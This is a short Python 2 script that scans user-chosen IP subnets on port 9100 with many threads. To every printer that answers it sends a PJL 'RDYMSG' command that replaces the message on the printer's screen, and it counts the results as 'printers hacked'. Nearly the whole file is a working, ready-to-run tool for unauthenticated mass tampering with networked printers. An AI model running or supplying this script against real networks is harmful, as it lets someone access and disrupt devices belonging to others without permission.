import os
import re
import time
import sys
import socket
from threading import Thread

PORT=9100
hackcount=0

#Startup stuff
print "----- PRINTER Message -----"
print
print "will print a message and display it on the screen of every printer in a subnet"
print
print
start=raw_input("First half of ip range for scanning [155.246]: ")
if start=="":
    start="1.1"
try:
    startnet=input("Starting subnet (" + start + ".X.*) [0]: ")
except:
    startnet=0
try:
    endnet=input("Finishing subnet (" + start + ".X.*) [255]: ")+1
except:
    endnet=256

#####Message to be displayed and the screen
message="while(herp)\n\tDurp;"
hack='\x1B%-12345X@PJL RDYMSG DISPLAY = \"' + message + '\"\r\n\x1B%-12345X\r\n'

#Threading Class, crazy stuff
class hackit(Thread):
   def __init__ (self,ip):
      Thread.__init__(self)
      self.ip = ip
      self.status = "wtf"
      self.hacked = 0
   def run(self):
    try:
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(.05)
        self.s.connect((self.ip, PORT))
        self.s.send(hack)
        #self.s.send(message)
        self.s.close()
        self.status = self.ip + ':\t' + 'DONE'
        self.hacked = 1
    except socket.error as msg:
        self.status = self.ip + ':\t\t' + str(msg)

#record the time we started to remember
starttime = time.ctime()

#scan through the subnets and send our message to all that let me in
for subnet in range (startnet, endnet):
    pinglist = []
    for host in range(256):
        ip = start + "." + str(subnet) + "." + str(host)
        current = hackit(ip)
        pinglist.append(current)
        current.start()
    for pingle in pinglist:
        pingle.join()
        if pingle.hacked:
            hackcount+=1
        #print pingle.status
    print "Subnet " + ip + " complete. " + str(hackcount) + " printers hacked."

#just tell the master how everything went and say im finished
print
print "Start:\t\t" + starttime
print "Finished:\t" + time.ctime()
print
print str(hackcount) + " printers messages sent"
